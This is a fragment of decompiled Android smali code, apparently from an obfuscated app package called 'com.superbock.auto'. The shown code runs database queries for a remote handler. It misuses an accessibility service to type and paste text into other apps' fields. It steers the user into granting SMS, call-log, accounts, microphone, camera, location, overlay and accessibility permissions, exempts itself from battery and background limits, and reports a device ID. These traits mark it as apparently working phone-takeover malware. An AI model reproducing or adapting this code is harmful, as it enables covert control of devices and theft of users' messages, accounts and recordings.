    invoke-static/range {p7 .. p7}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    invoke-virtual {v0}, Lz2/m;->b()Lz2/m;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v5, v1}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_7
    iput-object v0, v11, Lz2/k;->g:Lz2/m;

    move-object/from16 v0, v17

    iget-object v0, v0, Lg3/l;->a:Lt2/g;

    invoke-virtual {v11}, Lz2/k;->f()La3/e;

    move-result-object v1

    invoke-interface {v0, v1}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object v0
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    :goto_1
    const-string v1, "rows"

    move-object/from16 v2, v16

    invoke-virtual {v2, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v2}, Lf/a;->l()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v1, p1

    invoke-interface {v1, v0}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final e0(Ls3/g0;IIILjava/lang/String;Ljava/lang/String;)V
    .locals 16
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    move/from16 v0, p3

    move/from16 v1, p4

    move-object/from16 v2, p5

    move-object/from16 v3, p6

    const-string v4, "na"

    const-string v5, "pk"

    const-string v6, "ty"

    const-string v7, "ti"

    const-string v8, "%"

    new-instance v9, Lf/e;

    invoke-direct {v9}, Lf/e;-><init>()V

    const/16 v10, 0x521

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v10

    const-string v11, "code"

    invoke-virtual {v9, v11, v10}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/k;->b()Lg3/k;

    move-result-object v10

    invoke-static {v10}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v12, 0x0

    const/4 v14, 0x5

    const/4 v15, 0x1

    :try_start_0
    iget-object v11, v10, Lg3/k;->a:Lt2/g;

    invoke-interface {v11}, Lt2/g;->c()Lz2/h;

    move-result-object v11

    iput-boolean v15, v11, Lz2/h;->l:Z

    invoke-virtual {v11}, Lz2/k;->g()Lz2/m;

    move-result-object v15

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    invoke-virtual {v15, v7, v13}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    if-ne v1, v14, :cond_0

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    invoke-virtual {v15, v13}, Lz2/m;->e(Ljava/lang/Object;)Lz2/m;

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    const/4 v13, 0x3

    invoke-static {v13}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v15, v6, v12}, Lz2/m;->g(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    goto :goto_0

    :cond_0
    const/4 v12, 0x4

    if-eq v1, v12, :cond_1

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v15, v6, v12}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_1
    :goto_0
    invoke-static/range {p5 .. p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_2

    if-eq v1, v14, :cond_2

    const/4 v12, 0x1

    if-eq v1, v12, :cond_2

    const/4 v12, 0x2

    if-eq v1, v12, :cond_2

    const/4 v12, 0x3

    if-eq v1, v12, :cond_2

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v15, v5, v2}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_2
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_3

    if-eq v1, v14, :cond_3

    const/4 v12, 0x1

    if-eq v1, v12, :cond_3

    const/4 v12, 0x2

    if-eq v1, v12, :cond_3

    const/4 v12, 0x3

    if-eq v1, v12, :cond_3

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v15, v4, v12}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_3
    iput-object v15, v11, Lz2/k;->g:Lz2/m;

    iget-object v10, v10, Lg3/k;->a:Lt2/g;

    invoke-virtual {v11}, Lz2/k;->f()La3/e;

    move-result-object v11

    invoke-interface {v10, v11}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v10
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    const-wide/16 v10, 0x0

    :goto_1
    invoke-static {v10, v11}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v10

    const-string v11, "total"

    invoke-virtual {v9, v11, v10}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/k;->b()Lg3/k;

    move-result-object v10

    add-int/lit8 v11, p2, -0x1

    mul-int v11, v11, v0

    int-to-long v11, v11

    int-to-long v14, v0

    invoke-static {v10}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_1
    iget-object v0, v10, Lg3/k;->a:Lt2/g;

    invoke-interface {v0}, Lt2/g;->c()Lz2/h;

    move-result-object v0

    const/4 v13, 0x0

    invoke-virtual {v0, v7, v13}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static {v11, v12}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v11

    invoke-virtual {v0, v11}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {v14, v15}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v11

    iput-object v11, v0, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v0}, Lz2/k;->g()Lz2/m;

    move-result-object v11

    const/4 v12, 0x0

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    invoke-virtual {v11, v7, v13}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    const/4 v7, 0x5

    if-ne v1, v7, :cond_4

    invoke-virtual {v11}, Lz2/m;->b()Lz2/m;

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v11, v7}, Lz2/m;->e(Ljava/lang/Object;)Lz2/m;

    invoke-virtual {v11}, Lz2/m;->b()Lz2/m;

    const/4 v7, 0x3

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v11, v6, v12}, Lz2/m;->g(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    goto :goto_2

    :cond_4
    const/4 v7, 0x4

    if-eq v1, v7, :cond_5

    invoke-virtual {v11}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v11, v6, v7}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_5
    :goto_2
    invoke-static/range {p5 .. p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_6

    const/4 v6, 0x5

    if-eq v1, v6, :cond_6

    const/4 v6, 0x1

    if-eq v1, v6, :cond_6

    const/4 v6, 0x2

    if-eq v1, v6, :cond_6

    const/4 v6, 0x3

    if-eq v1, v6, :cond_6

    invoke-virtual {v11}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v11, v5, v2}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_6
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_7

    const/4 v2, 0x5

    if-eq v1, v2, :cond_7

    const/4 v2, 0x1

    if-eq v1, v2, :cond_7

    const/4 v2, 0x2

    if-eq v1, v2, :cond_7

    const/4 v2, 0x3

    if-eq v1, v2, :cond_7

    invoke-virtual {v11}, Lz2/m;->b()Lz2/m;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v11, v4, v1}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_7
    iput-object v11, v0, Lz2/k;->g:Lz2/m;

    iget-object v1, v10, Lg3/k;->a:Lt2/g;

    invoke-virtual {v0}, Lz2/k;->f()La3/e;

    move-result-object v0

    invoke-interface {v1, v0}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object v0
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    :goto_3
    const-string v1, "rows"

    invoke-virtual {v9, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v9}, Lf/a;->l()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v1, p1

    invoke-interface {v1, v0}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final f0(Ljava/lang/String;)Z
    .locals 7

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    invoke-virtual {v0}, Lcom/superbock/auto/BaseService;->i()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-nez v0, :cond_0

    const-string p1, "5"

    invoke-static {v3, p1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return v1

    :cond_0
    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_1

    const-string p1, "6"

    invoke-static {v3, p1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return v1

    :cond_1
    new-instance v4, Landroid/os/Bundle;

    invoke-direct {v4}, Landroid/os/Bundle;-><init>()V

    const-string v5, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    invoke-virtual {v4, v5, p1}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 v5, 0x200000

    invoke-virtual {v0, v5, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result v4

    const-string v5, "7"

    if-eqz v4, :cond_2

    invoke-static {v1, v5, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return v3

    :cond_2
    iget-object v4, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v6, "clipboard"

    invoke-virtual {v4, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/ClipboardManager;

    invoke-static {v2, p1}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    move-result-object p1

    invoke-virtual {v4, p1}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    const p1, 0x8000

    invoke-virtual {v0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    move-result p1

    if-eqz p1, :cond_3

    invoke-static {v1, v5, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return v3

    :cond_3
    return v1
.end method

.method public final g0(Ls3/g0;ILjava/lang/String;)V
    .locals 23
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move/from16 v2, p2

    move-object/from16 v3, p3

    const-string v6, "sendSms"

    const-string v7, "location"

    const-string v8, "recordAudio"

    const-string v9, "readSms"

    const-string v10, "notification"

    const/4 v15, 0x0

    invoke-static {v15}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "getAccounts"

    const-string v12, "readCallLog"

    const-string v13, "battery"

    const-string v15, "callPhone"

    const-string v11, "camera"

    const-string v14, "writeFile"

    const-string v1, "readContacts"

    move-object/from16 v17, v4

    const-string v4, "autoStart"

    move-object/from16 v18, v1

    const-string v1, "accessibility"

    move-object/from16 v19, v14

    const-string v14, "readImages"

    move-object/from16 v20, v11

    const-string v11, "overlay"

    if-eqz v2, :cond_1a

    move-object/from16 v21, v11

    const/4 v11, 0x1

    if-eq v2, v11, :cond_0

    goto/16 :goto_18

    :cond_0
    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v2}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_1

    const-string v1, "3"

    const/4 v2, 0x0

    :goto_0
    const/4 v3, 0x1

    goto/16 :goto_3

    :cond_1
    invoke-virtual/range {p0 .. p0}, Lf3/i$a;->p0()V

    invoke-static/range {p3 .. p3}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual/range {p3 .. p3}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/4 v11, 0x6

    sparse-switch v2, :sswitch_data_0

    goto/16 :goto_1

    :sswitch_0
    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2

    goto/16 :goto_1

    :cond_2
    const/16 v4, 0xf

    goto/16 :goto_2

    :sswitch_1
    invoke-virtual {v3, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_3

    goto/16 :goto_1

    :cond_3
    const/16 v4, 0xe

    goto/16 :goto_2

    :sswitch_2
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_4

    goto/16 :goto_1

    :cond_4
    const/16 v4, 0xd

    goto/16 :goto_2

    :sswitch_3
    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_5

    goto/16 :goto_1

    :cond_5
    const/16 v4, 0xc

    goto/16 :goto_2

    :sswitch_4
    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_6

    goto/16 :goto_1

    :cond_6
    const/16 v4, 0xb

    goto/16 :goto_2

    :sswitch_5
    invoke-virtual {v3, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_7

    goto/16 :goto_1

    :cond_7
    const/16 v4, 0xa

    goto/16 :goto_2

    :sswitch_6
    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_8

    goto/16 :goto_1

    :cond_8
    const/16 v4, 0x9

    goto/16 :goto_2

    :sswitch_7
    invoke-virtual {v3, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_9

    goto/16 :goto_1

    :cond_9
    const/16 v4, 0x8

    goto/16 :goto_2

    :sswitch_8
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_a

    goto :goto_1

    :cond_a
    const/4 v4, 0x7

    goto :goto_2

    :sswitch_9
    invoke-virtual {v3, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_b

    goto :goto_1

    :cond_b
    const/4 v4, 0x6

    goto :goto_2

    :sswitch_a
    invoke-virtual {v3, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_c

    goto :goto_1

    :cond_c
    const/4 v4, 0x5

    goto :goto_2

    :sswitch_b
    invoke-virtual {v3, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_d

    goto :goto_1

    :cond_d
    const/4 v4, 0x4

    goto :goto_2

    :sswitch_c
    move-object/from16 v2, v21

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_e

    goto :goto_1

    :cond_e
    const/4 v4, 0x3

    goto :goto_2

    :sswitch_d
    move-object/from16 v2, v20

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_f

    goto :goto_1

    :cond_f
    const/4 v4, 0x2

    goto :goto_2

    :sswitch_e
    move-object/from16 v2, v19

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_10

    goto :goto_1

    :cond_10
    const/4 v4, 0x1

    goto :goto_2

    :sswitch_f
    move-object/from16 v2, v18

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_11

    goto :goto_1

    :cond_11
    const/4 v4, 0x0

    goto :goto_2

    :goto_1
    const/4 v4, -0x1

    :goto_2
    const/high16 v2, 0x10000000

    packed-switch v4, :pswitch_data_0

    goto/16 :goto_18

    :pswitch_0
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v1

    if-nez v1, :cond_12

    invoke-static {}, Landroid/os/Looper;->prepare()V

    :cond_12
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    sget-object v2, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    invoke-virtual {v2, v1}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->whitelistSettings(Landroid/content/Context;)V

    goto/16 :goto_18

    :pswitch_1
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v1}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v1

    invoke-virtual {v1}, Landroidx/core/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v1

    if-eqz v1, :cond_13

    goto/16 :goto_5

    :cond_13
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    sget-object v2, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    invoke-virtual {v2, v1}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->reqNotificationPermissionsIfNotEnabled(Landroid/content/Context;)V

    goto/16 :goto_6

    :pswitch_2
    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v3}, Lk3/a;->f(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_15

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x18

    if-lt v2, v3, :cond_14

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v2

    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityService;->disableSelf()V

    new-instance v2, Lf/e;

    invoke-direct {v2}, Lf/e;-><init>()V

    const-string v3, "action"

    const-string v4, "saveDev"

    invoke-virtual {v2, v3, v4}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v3, 0x3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "step"

    invoke-virtual {v2, v4, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v3}, Lk3/a;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "deviceId"

    invoke-virtual {v2, v4, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    move-object/from16 v3, v17

    invoke-virtual {v2, v1, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v1, Lf3/j;

    invoke-direct {v1}, Lf3/j;-><init>()V

    invoke-static {v2, v1}, Lk3/i;->a(Lf/e;Ls3/e;)V

    :cond_14
    const/4 v1, 0x0

    sput-boolean v1, Lcom/superbock/auto/BaseService;->B:Z

    sput-boolean v1, Lcom/superbock/auto/BaseService;->z:Z

    invoke-virtual/range {p0 .. p1}, Lf3/i$a;->l0(Ls3/g0;)V

    move-object/from16 v11, p1

    const/4 v2, 0x0

    invoke-virtual {v0, v11, v1, v2}, Lf3/i$a;->g0(Ls3/g0;ILjava/lang/String;)V

    const-string v1, "54"

    goto/16 :goto_0

    :goto_3
    invoke-static {v3, v1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_18

    :cond_15
    sget v1, Le3/d;->a:I

    const-string v3, "android.settings.ACCESSIBILITY_SETTINGS"

    if-ne v1, v11, :cond_16

    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-string v4, "com.samsung.accessibility.installed_service"

    invoke-direct {v1, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v4, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v4, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_6

    :catch_0
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    goto :goto_4

    :cond_16
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    :goto_4
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_6

    :pswitch_3
    sget v1, Le3/d;->a:I

    const/4 v3, 0x2

    if-ne v1, v3, :cond_17

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.miui.powerkeeper"

    const-string v5, "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const-string v4, "package_name"

    invoke-virtual {v1, v4, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v3}, Lk3/a;->b(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "package_label"

    invoke-virtual {v1, v4, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v4, 0x0

    goto :goto_7

    :cond_17
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    sget-object v2, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    invoke-virtual {v2, v1}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->hasBatteryStrategy(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_18

    goto :goto_5

    :cond_18
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v2, v1}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->batteryStrategy(Landroid/content/Context;)V

    goto :goto_6

    :pswitch_4
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    if-lt v1, v2, :cond_19

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v1}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_19

    :goto_5
    const-string v1, "23"

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-static {v2, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_18

    :cond_19
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    sget-object v2, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    invoke-virtual {v2, v1}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->reqPopWindowPermissions(Landroid/content/Context;)V

    :goto_6
    const/4 v4, 0x0

    goto :goto_8

    :pswitch_5
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const-string v3, "package"

    const/4 v4, 0x0

    invoke-static {v3, v2, v4}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    :goto_7
    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :goto_8
    const-string v1, "41"

    const/4 v2, 0x1

    invoke-static {v2, v1, v4}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_18

    :cond_1a
    move-object v2, v11

    move-object/from16 v3, v17

    move-object/from16 v11, v20

    const/16 v16, 0x0

    move-object/from16 v17, v4

    move-object/from16 v4, v19

    move-object/from16 v19, v15

    move-object/from16 v22, v18

